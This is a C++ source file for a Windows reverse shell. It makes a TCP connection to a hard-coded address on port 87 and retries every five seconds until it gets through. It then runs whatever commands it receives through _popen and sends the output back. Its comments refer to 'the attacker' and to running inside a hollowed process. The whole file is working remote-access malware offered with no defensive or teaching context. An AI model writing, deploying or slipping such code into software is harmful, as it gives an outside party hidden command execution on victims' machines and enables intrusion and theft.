#include <winsock2.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

void ExecuteResidentShell(SOCKET s) {
    char buffer[8192];      // Increased to handle long incoming scripts
    char cmdResult[8192];   // Increased to handle wide table outputs   
    
    while (true) {
        // 1. Receive command from the socket
        int bytesReceived = recv(s, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) break; 

        buffer[bytesReceived] = '\0';
        std::string command(buffer);

        // 2. Internal Command Handling (Exit)
        if (command.find("exit") != std::string::npos) break;

        // 3. Use _popen to execute command and capture output internally
        // This keeps everything inside the memory of the current process
        FILE* fp = _popen(command.c_str(), "r");
        if (fp == NULL) {
            const char* err = "Failed to execute command.\n";
            send(s, err, strlen(err), 0);
            continue;
        }

        // 4. Send output back in chunks
        while (fgets(cmdResult, sizeof(cmdResult), fp) != NULL) {
            send(s, cmdResult, strlen(cmdResult), 0);
        }
        _pclose(fp);
        
        // Send a delimiter so the attacker knows the command finished
        send(s, "\nCMD_FIN>\n", 10, 0);
    }
}

int main() {
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockaddr_in a = { 0 };
    a.sin_family = AF_INET;
    a.sin_port = htons(87);
    a.sin_addr.s_addr = inet_addr("192.168.10.103");

    // Persistent reconnection logic
    while (WSAConnect(s, (SOCKADDR*)&a, sizeof(a), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        Sleep(5000);
    }

    // Execute the shell loop inside the hollowed process
    ExecuteResidentShell(s);

    closesocket(s);
    WSACleanup();
    return 0;
}